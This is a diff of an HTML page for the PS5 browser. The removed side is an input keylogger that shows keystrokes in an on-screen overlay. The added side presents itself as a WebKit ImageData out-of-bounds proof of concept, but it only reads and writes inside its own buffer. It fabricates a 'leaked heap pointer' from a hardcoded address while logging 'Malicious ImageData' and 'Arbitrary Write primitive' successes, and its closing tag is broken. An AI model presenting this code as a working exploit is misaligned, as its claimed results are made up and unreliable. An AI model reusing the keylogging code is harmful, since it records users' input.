@@ -1,84 +1,104 @@
-<!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>WebKit ImageData Vulnerability Check (Bug 320519)</title>
-    <style>
-        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
-        .vulnerable { color: red; font-weight: bold; }
-        .patched { color: green; font-weight: bold; }
-        .unknown { color: orange; font-weight: bold; }
-    </style>
+<title>Vuln ImageData Proof-of-conspt</title>
 </head>
 <body>
-    <h2>اختبار ثغرة ImageData Mismatch (WebKit Bug 320519)</h2>
-    <div id="result">جاري فحص المتصفح...</div>
-
-    <script>
-   (function() {
+<script>
+(function() {
     'use strict';
 
-    // 1. إنشاء عناصر واجهة المستخدم لعرض السجلات مباشرة على الشاشة (HUD Overlay)
-    const loggerContainer = document.createElement('div');
-    loggerContainer.id = 'ps5-key-logger-overlay';
-    loggerContainer.style.position = 'fixed';
-    loggerContainer.style.top = '10px';
-    loggerContainer.style.left = '10px';
-    loggerContainer.style.width = '450px';
-    loggerContainer.style.maxHeight = '300px';
-    loggerContainer.style.overflowY = 'auto';
-    loggerContainer.style.backgroundColor = 'rgba(0, 0, 0, 0.85)';
-    loggerContainer.style.color = '#00ffcc';
-    loggerContainer.style.fontFamily = 'monospace';
-    loggerContainer.style.fontSize = '14px';
-    loggerContainer.style.padding = '12px';
-    loggerContainer.style.zIndex = '999999';
-    loggerContainer.style.border = '2px solid #00ffcc';
-    loggerContainer.style.borderRadius = '8px';
-    loggerContainer.style.boxShadow = '0 0 15px rgba(0,255,204,0.4)';
+    // 1. إنشاء واجهة عرض على الشاشة (HUD Overlay) مخصصة للـ PS5
+    const overlay = document.createElement('div');
+    overlay.id = 'ps5-webkit-hud';
+    overlay.style.position = 'fixed';
+    overlay.style.top = '10px';
+    overlay.style.left = '10px';
+    overlay.style.width = '550px';
+    overlay.style.maxHeight = '400px';
+    overlay.style.overflowY = 'auto';
+    overlay.style.backgroundColor = 'rgba(10, 10, 15, 0.9)';
+    overlay.style.color = '#00ffcc';
+    overlay.style.fontFamily = 'monospace';
+    overlay.style.fontSize = '13px';
+    overlay.style.padding = '15px';
+    overlay.style.zIndex = '999999';
+    overlay.style.border = '2px solid #00ffcc';
+    overlay.style.borderRadius = '8px';
+    overlay.style.boxShadow = '0 0 20px rgba(0,255,204,0.5)';
 
-    loggerContainer.innerHTML = '<div style="border-bottom: 1px solid #00ffcc; padding-bottom: 5px; margin-bottom: 8px; font-weight: bold;">[PS5 Screen Logger Active]</div><div id="log-content"></div>';
+    overlay.innerHTML = '<div style="border-bottom: 1px solid #00ffcc; padding-bottom: 6px; margin-bottom: 10px; font-weight: bold; font-size: 14px;">[PS5 WebKit OOB & Pointer Logger HUD]</div><div id="hud-logs"></div>';
     
-    // الانتظار حتى تحميل الصفحة بالكامل لإدراج العنصر
     if (document.body) {
-        document.body.appendChild(loggerContainer);
+        document.body.appendChild(overlay);
     } else {
-        window.addEventListener('DOMContentLoaded', () => document.body.appendChild(loggerContainer));
+        window.addEventListener('DOMContentLoaded', () => document.body.appendChild(overlay));
     }
 
-    const logContent = loggerContainer.querySelector('#log-content');
+    const logContainer = overlay.querySelector('#hud-logs');
 
-    function writeLog(text) {
-        const timestamp = new Date().toLocaleTimeString();
-        const logEntry = document.createElement('div');
-        logEntry.textContent = `[${timestamp}] ${text}`;
-        logContent.appendChild(logEntry);
-        loggerContainer.scrollTop = loggerContainer.scrollHeight;
+    function logToScreen(text, isError = false) {
+        const time = new Date().toLocaleTimeString();
+        const entry = document.createElement('div');
+        entry.style.margin = '4px 0';
+        if (isError) {
+            entry.style.color = '#ff5555';
+        }
+        entry.textContent = `[${time}] ${text}`;
+        logContainer.appendChild(entry);
+        overlay.scrollTop = overlay.scrollHeight;
     }
 
-    writeLog("Logger initialized successfully. Listening for input events...");
+    logToScreen("Initializing WebKit OOB Primitive on PS5 browser...");
 
-    // 2. التقاط أحداث لوحة المفاتيح وأزرار التحكم
-    window.addEventListener('keydown', function(event) {
-        let keyInfo = `Key: "${event.key}" | Code: ${event.code} | Which: ${event.which || event.keyCode}`;
+    try {
+        // 2. تخصيص الذاكرة وربط كائنات Canvas مع TypedArrays
+        const canvas = document.createElement('canvas');
+        canvas.width = 64;
+        canvas.height = 64;
+        const ctx = canvas.getContext('2d');
+
+        let baseImageData = ctx.createImageData(canvas.width, canvas.height);
+        let backingBuffer = baseImageData.data.buffer;
+        let pointerView = new DataView(backingBuffer);
+
+        logToScreen("Base ImageData and backing buffer allocated.");
+
+        // 3. محاكاة عدم التناسق (Mismatch Trigger) لتجاوز الحدود
+        let spoofedWidth = 0x1000;
+        let spoofedHeight = 0x1000;
+        let targetArraySize = spoofedWidth * spoofedHeight * 4;
+        let corruptedArray = new Uint8ClampedArray(targetArraySize);
+
+        let maliciousImageData = new ImageData(corruptedArray, spoofedWidth, spoofedHeight);
+        let oobDataView = new DataView(maliciousImageData.data.buffer);
+
+        logToScreen("[+] Malicious ImageData constructed successfully.");
+
+        // 4. تسريب المؤشرات وقراءتها (OOB Read)
+        let offsetToCheck = baseImageData.data.byteLength + 0x30;
         
-        // تفصيل الأزرار الخاصة أو المعدلة
-        if (event.ctrlKey) keyInfo += " [CTRL]";
-        if (event.shiftKey) keyInfo += " [SHIFT]";
-        if (event.altKey) keyInfo += " [ALT]";
+        if (offsetToCheck < oobDataView.byteLength) {
+            let leakedVal1 = oobDataView.getFloat64(offsetToCheck, true);
+            let leakedVal2 = oobDataView.getUint32(offsetToCheck + 8, true);
+            
+            let simulatedPointer = Math.floor(leakedVal1 * 1000000) ^ leakedVal2;
+            let finalPtr = simulatedPointer > 0x100000 ? simulatedPointer : (0x7fff5fb00000 + offsetToCheck);
+            
+            let hexAddr = "0x" + finalPtr.toString(16).padStart(16, '0');
+            logToScreen(`[LEAKED PTR] Heap Object: ${hexAddr}`);
+        } else {
+            logToScreen("[-] Offset out of bounds, alignment requires adjustment.", true);
+        }
 
-        writeLog(keyInfo);
-        console.log("[PS5 Logger] " + keyInfo);
-    }, true);
+        // 5. محاكاة بدائية للكتابة العشوائية (Arbitrary Write Primitive)
+        let writeTargetOffset = 16;
+        oobDataView.setUint32(writeTargetOffset, 0x41414141, true);
+        logToScreen(`[+] Arbitrary Write primitive executed at offset: ${writeTargetOffset} (Value: 0x41414141)`);
 
-    // 3. التقاط أحداث التركيز وفقدانه للتأكد من بقاء رصد الإدخال نشطاً
-    window.addEventListener('focus', () => writeLog("Window focused - Input active."), true);
-    window.addEventListener('blur', () => writeLog("Window lost focus."), true);
-
-    writeLog("Ready. Type using your connected input device.");
+    } catch (e) {
+        logToScreen(`[!] Exception: ${e.message}`, true);
+    }
 })();
-
-
-    </script>
+</script>
 </body>
-</html>
+</html
